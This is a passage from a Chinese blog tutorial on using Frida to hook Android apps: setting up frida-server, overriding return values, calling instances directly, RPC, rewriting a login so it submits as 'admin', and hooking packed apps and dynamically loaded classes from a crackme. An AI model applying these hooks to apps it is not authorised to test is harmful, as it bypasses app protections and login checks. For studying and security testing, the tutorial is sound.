open(&quot;si.js&quot;) as f:</span><br><span class="line">    script &#x3D; session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line">input() #等待输入</span><br></pre></td></tr></table></figure><p>解释一下，这个脚本就是先通过<code>frida.get_device_manager().add_remote_device</code>来找到device,然后spawn方式启动settings，然后attach到上面，并执行frida脚本。</p><h2 id="Frida使用"><a href="#Frida使用" class="headerlink" title="Frida使用"></a>Frida使用</h2><p>查看自己模拟器或者手机架构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure><p>1.下载frida-server并解压</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;frida&#x2F;frida&#x2F;releases</span><br></pre></td></tr></table></figure><p>2.运行adb shell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb push &#x2F;Users&#x2F;sakura&#x2F;Desktop&#x2F;lab&#x2F;alpha&#x2F;tools&#x2F;android&#x2F;frida-server-x.x.x-android-arm64 &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">chmod +x frida-server</span><br><span class="line">.&#x2F;frida-server</span><br></pre></td></tr></table></figure><p>如果要监听端口：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;frida-server -l 0.0.0.0:8888</span><br></pre></td></tr></table></figure><h1 id="Frida基础"><a href="#Frida基础" class="headerlink" title="Frida基础"></a>Frida基础</h1><h2 id="frida查看当前存在的进程"><a href="#frida查看当前存在的进程" class="headerlink" title="frida查看当前存在的进程"></a>frida查看当前存在的进程</h2><p><code>frida-ps -U</code>查看通过usb连接的android手机上的进程。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ frida-ps --help</span><br><span class="line">Usage: frida-ps [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program&#39;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -D ID, --device&#x3D;ID    connect to device with the given ID</span><br><span class="line">  -U, --usb             connect to USB device</span><br><span class="line">  -R, --remote          connect to remote frida-server</span><br><span class="line">  -H HOST, --host&#x3D;HOST  connect to remote frida-server on HOST</span><br><span class="line">  -a, --applications    list only applications</span><br><span class="line">  -i, --installed       include all installed applications</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida-ps -H 172.20.10.5:8888</span><br><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>通过grep过滤就可以找到我们想要的包名。</p><h2 id="frida打印参数和修改返回值"><a href="#frida打印参数和修改返回值" class="headerlink" title="frida打印参数和修改返回值"></a>frida打印参数和修改返回值</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.example.frida_demo;</span><br><span class="line"></span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import androidx.appcompat.app.AppCompatActivity;</span><br><span class="line">import android.util.Log;</span><br><span class="line"></span><br><span class="line">public class MainActivity extends AppCompatActivity &#123;</span><br><span class="line"></span><br><span class="line">    private String total &#x3D; &quot;@@@###@@@&quot;;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        while (true)&#123;</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                Thread.sleep(1000);</span><br><span class="line">            &#125; catch (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(50,30);</span><br><span class="line">            Log.d(&quot;sakura.string&quot; , fun(&quot;LoWeRcAsE Me!!!!!!!!!&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void fun(int x , int y )&#123;</span><br><span class="line">        Log.d(&quot;sakura.Sum&quot; , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String fun(String x)&#123;</span><br><span class="line">        total +&#x3D;x;</span><br><span class="line">        return x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String secret()&#123;</span><br><span class="line">        return total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function main()&#123;</span><br><span class="line">    console.log(&quot;Enter the Script&quot;);</span><br><span class="line">    Java.perform(function x()&#123;</span><br><span class="line">        console.log(&quot;Inside Java perform&quot;);</span><br><span class="line">        var MainActivity &#x3D; Java.use(&#39;com.example.frida_demo.MainActivity&#39;);</span><br><span class="line">        &#x2F;&#x2F;重载找到制定的函数</span><br><span class="line">        MainActivity.fun.overload(&quot;java.lang.String&quot;).implementation &#x3D; function(str)&#123;</span><br><span class="line">            &#x2F;&#x2F;打印参数</span><br><span class="line">            var ret_value &#x3D; &quot;ol4three&quot;;</span><br><span class="line">            return ret_value;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ frida-ps -U | grep com.example.frida_demo</span><br><span class="line">30592  com.example.frida_demo</span><br><span class="line"></span><br><span class="line">╰─$ frida -U -f com.example.frida_demo -l hook_string1.js --no-pause</span><br><span class="line"></span><br><span class="line">╰─$ adb logcat</span><br><span class="line">12-27 18:01:56.002  7041  7041 D ol4three.Sum: 80</span><br><span class="line">12-27 18:01:56.004  7041  7041 D ol4three.string: ol4three</span><br></pre></td></tr></table></figure><h2 id="frida寻找instance，主动调用"><a href="#frida寻找instance，主动调用" class="headerlink" title="frida寻找instance，主动调用"></a>frida寻找instance，主动调用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function main()&#123;</span><br><span class="line">    console.log(&quot;Enter the Script&quot;);</span><br><span class="line">    Java.perform(function x()&#123;</span><br><span class="line">        console.log(&quot;Inside Java perform&quot;);</span><br><span class="line">        var MainActivity &#x3D; Java.use(&#39;com.example.frida_demo.MainActivity&#39;);</span><br><span class="line">        &#x2F;&#x2F;重载找到制定的函数</span><br><span class="line">        MainActivity.fun.overload(&quot;java.lang.String&quot;).implementation &#x3D; function(str)&#123;</span><br><span class="line">            &#x2F;&#x2F;打印参数</span><br><span class="line">            var ret_value &#x3D; &quot;ol4three&quot;;</span><br><span class="line">            return ret_value;</span><br><span class="line">        &#125;;</span><br><span class="line">        &#x2F;&#x2F;寻找类型为classname的实例</span><br><span class="line">        Java.choose(&quot;com.example.frida_demo.MainActivity&quot;,&#123;</span><br><span class="line">            onMatch: function(x)&#123;</span><br><span class="line">                console.log(&quot;find instance :&quot; + x);</span><br><span class="line">                console.log(&quot;result of secret func:&quot; + x.secret());</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function()&#123;</span><br><span class="line">                console.log(&quot;end&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Enter the Script</span><br><span class="line">Inside Java perform</span><br><span class="line">find instance :com.example.frida_demo.MainActivity@bb40738</span><br><span class="line">result of secret func:@@@###@@@</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="frida-rpc"><a href="#frida-rpc" class="headerlink" title="frida rpc"></a>frida rpc</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function callFun()&#123;</span><br><span class="line">    Java.perform(function fn()&#123;</span><br><span class="line">        console.log(&#39;begin&#39;);</span><br><span class="line">        Java.choose(&quot;com.example.frida_demo.MainActivity&quot;,&#123;</span><br><span class="line">            onMatch: function(x)&#123;</span><br><span class="line">                console.log(&quot;find instance :&quot; + x);</span><br><span class="line">                console.log(&quot;result of fun(string) func:&quot; + x.fun(Java.use(&quot;java.lang.String&quot;).$new(&quot;space&quot;)));</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function()&#123;</span><br><span class="line">                console.log(&quot;end&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">rpc.exports &#x3D; &#123;</span><br><span class="line">    callfun : callFun</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import time,frida</span><br><span class="line"></span><br><span class="line">device &#x3D; frida.get_usb_device()</span><br><span class="line">pid &#x3D; device.spawn([&quot;com.example.frida_demo&quot;])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(1)</span><br><span class="line">session &#x3D; device.attach(pid)</span><br><span class="line">with open(&quot;frida_demo_rpc_call.js&quot;) as f:</span><br><span class="line">    script &#x3D; session.create_script(f.read())</span><br><span class="line"></span><br><span class="line">def my_message_handler(message, payload):</span><br><span class="line">    print(message)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">script.on(&quot;message&quot;, my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">script.exports.callfun()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python3 frida_rpc_loader.py</span><br><span class="line">begin</span><br><span class="line">find instance :com.example.frida_demo.MainActivity@bb40738</span><br><span class="line">result of fun(string) func:space</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="frida动态修改"><a href="#frida动态修改" class="headerlink" title="frida动态修改"></a>frida动态修改</h2><p>将手机上的app内容发送到PC上的frida 程序，处理后返回给app，然后app在做后续的流程，核心是send/recv函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res&#x2F;android&quot;</span><br><span class="line">    xmlns:app&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res-auto&quot;</span><br><span class="line">    xmlns:tools&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;tools&quot;</span><br><span class="line">    android:layout_width&#x3D;&quot;match_parent&quot;</span><br><span class="line">    android:layout_height&#x3D;&quot;match_parent&quot;</span><br><span class="line">    tools:context&#x3D;&quot;.MainActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;TextView</span><br><span class="line">        android:id&#x3D;&quot;@+id&#x2F;textView&quot;</span><br><span class="line">        android:layout_width&#x3D;&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;wrap_content&quot;</span><br><span class="line">        android:text&#x3D;&quot;please input username and password&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintLeft_toLeftOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintRight_toRightOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;EditText</span><br><span class="line">        android:id&#x3D;&quot;@+id&#x2F;editText&quot;</span><br><span class="line">        android:layout_width&#x3D;&quot;fill_parent&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;48dp&quot;</span><br><span class="line">        android:hint&#x3D;&quot;username&quot;</span><br><span class="line">        android:maxLength&#x3D;&quot;20&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintEnd_toEndOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintHorizontal_bias&#x3D;&quot;1.0&quot;</span><br><span class="line">        app:layout_constraintStart_toStartOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintVertical_bias&#x3D;&quot;0.095&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;EditText</span><br><span class="line">        android:id&#x3D;&quot;@+id&#x2F;editText2&quot;</span><br><span class="line">        android:layout_width&#x3D;&quot;fill_parent&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;48dp&quot;</span><br><span class="line">        android:hint&#x3D;&quot;password&quot;</span><br><span class="line">        android:maxLength&#x3D;&quot;20&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintVertical_bias&#x3D;&quot;0.239&quot;</span><br><span class="line">        tools:ignore&#x3D;&quot;MissingConstraints&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;Button</span><br><span class="line">        android:id&#x3D;&quot;@+id&#x2F;button&quot;</span><br><span class="line">        android:layout_width&#x3D;&quot;100dp&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;48dp&quot;</span><br><span class="line">        android:layout_gravity&#x3D;&quot;right|center_horizontal&quot;</span><br><span class="line">        android:text&#x3D;&quot;提交&quot;</span><br><span class="line">        android:visibility&#x3D;&quot;visible&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintEnd_toEndOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintStart_toStartOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintVertical_bias&#x3D;&quot;0.745&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;androidx.constraintlayout.widget.ConstraintLayout&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MainActivity extends AppCompatActivity &#123;</span><br><span class="line"></span><br><span class="line">    EditText username_et;</span><br><span class="line">    EditText password_et;</span><br><span class="line">    TextView message_tv;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        username_et &#x3D; this.findViewById((R.id.editText));</span><br><span class="line">        password_et &#x3D; this.findViewById(R.id.editText2);</span><br><span class="line">        message_tv &#x3D; this.findViewById(R.id.textView);</span><br><span class="line"></span><br><span class="line">        this.findViewById(R.id.button).setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onClick(View view) &#123;</span><br><span class="line">                if (username_et.getText().toString().compareTo(&quot;admin&quot;) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                    message_tv.setText(&quot;You cannot login as admin&quot;);</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;&#x2F;hook target</span><br><span class="line">                message_tv.setText(&quot;Sending to the server :&quot; + android.util.Base64.encodeToString((username_et.getText().toString() + &quot;:&quot; + password_et.getText().toString()).getBytes(StandardCharsets.UTF_8), Base64.DEFAULT));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析一下我们的目的是让message_tv.setText来发送admin的base64字符串。所以我们需要hook TextView.setText这个函数。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211229190444921.png" alt="image-20211229190444921" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python3 frida_demo_rpc_loader2.py</span><br><span class="line">Script loaded successfully</span><br><span class="line">&#123;&#39;type&#39;: &#39;send&#39;, &#39;payload&#39;: &#39;Sending to the server :ZWVlZWU6MTIzMTIz\n&#39;&#125;</span><br><span class="line">None</span><br><span class="line">Sending to the server :ZWVlZWU6MTIzMTIz</span><br><span class="line"></span><br><span class="line">message: &#123;&#39;type&#39;: &#39;send&#39;, &#39;payload&#39;: &#39;Sending to the server :ZWVlZWU6MTIzMTIz\n&#39;&#125;</span><br><span class="line">data: b&#39;eeeee:123123&#39;</span><br><span class="line">pw: 123123&#39;</span><br><span class="line">encoded data: b&#39;YWRtaW46MTIzMTIzJw&#x3D;&#x3D;&#39;</span><br><span class="line">Modified data sent</span><br><span class="line">string_to_recv: b&#39;YWRtaW46MTIzMTIzJw&#x3D;&#x3D;&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YWRtaW46MTIzMTIzJw&#x3D;&#x3D;   admin:123123&#39;</span><br></pre></td></tr></table></figure><h2 id="API-List"><a href="#API-List" class="headerlink" title="API List"></a>API List</h2><ul><li><code>Java.choose(className: string, callbacks: Java.ChooseCallbacks): void</code><br>通过扫描Java VM的堆来枚举className类的live instance。</li><li><code>Java.use(className: string): Java.Wrapper&lt;&#123;&#125;&gt;</code><br>动态为className生成JavaScript Wrapper，可以通过调用<code>$new()</code>来调用构造函数来实例化对象。<br>在实例上调用<code>$dispose()</code>以对其进行显式清理，或者等待JavaScript对象被gc。 </li><li><code>Java.perform(fn: () =&gt; void): void</code><br>Function to run while attached to the VM.<br>Ensures that the current thread is attached to the VM and calls fn. (This isn’t necessary in callbacks from Java.)<br>Will defer calling fn if the app’s class loader is not available yet. Use Java.performNow() if access to the app’s classes is not needed.</li><li><code>send(message: any, data?: ArrayBuffer | number[]): void</code><br>任何JSON可序列化的值。<br>将JSON序列化后的message发送到您的基于Frida的应用程序，并包含(可选)一些原始二进制数据。<br>The latter is useful if you e.g. dumped some memory using NativePointer#readByteArray().</li><li><code>recv(callback: MessageCallback): MessageRecvOperation</code><br>Requests callback to be called on the next message received from your Frida-based application.<br>This will only give you one message, so you need to call recv() again to receive the next one.</li><li><code>wait(): void</code><br>堵塞，直到message已经receive并且callback已经执行完毕并返回</li></ul><h2 id="更新中。。。"><a href="#更新中。。。" class="headerlink" title="更新中。。。"></a>更新中。。。</h2><h1 id="Android-加固应用Hook方式-Frida"><a href="#Android-加固应用Hook方式-Frida" class="headerlink" title="Android 加固应用Hook方式-Frida"></a>Android 加固应用Hook方式-Frida</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var application &#x3D; Java.use(&#39;android.app.Application&#39;);</span><br><span class="line"></span><br><span class="line">    application.attach.overload(&#39;android.content.Context&#39;).implementation &#x3D; function(context)&#123;</span><br><span class="line"></span><br><span class="line">        var result &#x3D; this.attach(context);</span><br><span class="line">        var classloader &#x3D; context.getClassLoader();</span><br><span class="line">        Java.classFactory.loader &#x3D; classloader;</span><br><span class="line"></span><br><span class="line">        var yeyoulogin &#x3D; Java.classFactory.use(&#39;com.zcm.主窗口&#39;);</span><br><span class="line">        console.log(&quot;yeyoulogin:&quot;+ yeyoulogin);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        yeyoulogin.按钮_用户登录$被单击.implementation &#x3D; function(arg)&#123;</span><br><span class="line">            console.log(&quot;retval:&quot;+ this.返回值);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>列出加载的类</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.enumerateLoadedClasses(</span><br><span class="line">  &#123;</span><br><span class="line">  &quot;onMatch&quot;: function(className)&#123; </span><br><span class="line">        console.log(className) </span><br><span class="line">    &#125;,</span><br><span class="line">  &quot;onComplete&quot;:function()&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="Hook-动态加载类"><a href="#Hook-动态加载类" class="headerlink" title="Hook 动态加载类"></a>Hook 动态加载类</h1><h2 id="获取构造函数的参数"><a href="#获取构造函数的参数" class="headerlink" title="获取构造函数的参数"></a>获取构造函数的参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        &#x2F;&#x2F;创建一个DexClassLoader的wapper</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        &#x2F;&#x2F;hook 它的构造函数$init，我们将它的四个参数打印出来看看。</span><br><span class="line">        dexclassLoader.$init.implementation &#x3D; function(dexPath,optimizedDirectory,librarySearchPath,parent)&#123;</span><br><span class="line">            console.log(&quot;dexPath:&quot;+dexPath);</span><br><span class="line">            console.log(&quot;optimizedDirectory:&quot;+optimizedDirectory);</span><br><span class="line">            console.log(&quot;librarySearchPath:&quot;+librarySearchPath);</span><br><span class="line">            console.log(&quot;parent:&quot;+parent);</span><br><span class="line">            &#x2F;&#x2F;不破换它原本的逻辑，我们调用它原本的构造函数。</span><br><span class="line">          this.$init(dexPath,optimizedDirectory,librarySearchPath,parent);</span><br><span class="line">        &#125;</span><br><span class="line">        console.log(&quot;down!&quot;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="获取动态加载的类"><a href="#获取动态加载的类" class="headerlink" title="获取动态加载的类"></a>获取动态加载的类</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line"></span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">           &#x2F;&#x2F;定义一个String变量，指定我们需要的类</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            &#x2F;&#x2F;直接调用第二个重载方法，跟原本的逻辑相同。</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line">            &#x2F;&#x2F;如果loadClass的name参数和我们想要hook的类名相同</span><br><span class="line">            if(name &#x3D;&#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                &#x2F;&#x2F;则拿到它的值</span><br><span class="line">                hookClass &#x3D; result;</span><br><span class="line">                &#x2F;&#x2F;打印hookClass变量的值</span><br><span class="line">                console.log(hookClass);</span><br><span class="line">                send(hookClass);</span><br><span class="line">                return result;</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>通过Java.cast处理泛型方法(JAVA中Class&lt;?&gt;表示泛型)，在调用动态加载方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var constructorclass &#x3D; Java.use(&quot;java.lang.reflect.Constructor&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"></span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                console.log(&quot;------------------------------CAST--------------------------------&quot;)</span><br><span class="line">                &#x2F;&#x2F;类型转换</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                &#x2F;&#x2F;调用getMethods()获取类下的所有方法</span><br><span class="line">                var methods &#x3D; hookClassCast.getMethods();</span><br><span class="line">                console.log(methods);</span><br><span class="line">                console.log(&quot;-----------------------------NOT CAST-----------------------------&quot;)</span><br><span class="line">                &#x2F;&#x2F;未进行类型转换，看看能否调用getMethods()方法</span><br><span class="line">                var methodtest &#x3D; hookClass.getMethods();</span><br><span class="line">                console.log(methodtest);</span><br><span class="line">                console.log(&quot;---------------------OVER------------------------&quot;)</span><br><span class="line">                return result;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>利用getDeclaredConstructor()获取具有指定参数列表构造函数的Constructor 并实例化</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        &#x2F;&#x2F;实例化MainActivity对象</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"></span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------BEGIN-------------------------------------&quot;);</span><br><span class="line">                &#x2F;&#x2F;获取构造器</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                &#x2F;&#x2F;实例化，newInstance的参数也是Ljava.lang.Object;</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;patchAc:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line">console.log(&quot;--------------------------------------------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>利用getDeclaredMethods()，获取本类中的所有方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        &#x2F;&#x2F;实例化MainActivity对象</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"></span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------BEGIN-------------------------------------&quot;);</span><br><span class="line">                &#x2F;&#x2F;获取构造器</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                &#x2F;&#x2F;实例化，newInstance的参数也是Ljava.lang.Object;</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;MainActivityPatchInstance:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line">                console.log(&quot;----------------------------Methods---------------------------------&quot;);</span><br><span class="line">                var func &#x3D; hookClassCast.getDeclaredMethods();</span><br><span class="line">                console.log(func);</span><br><span class="line">          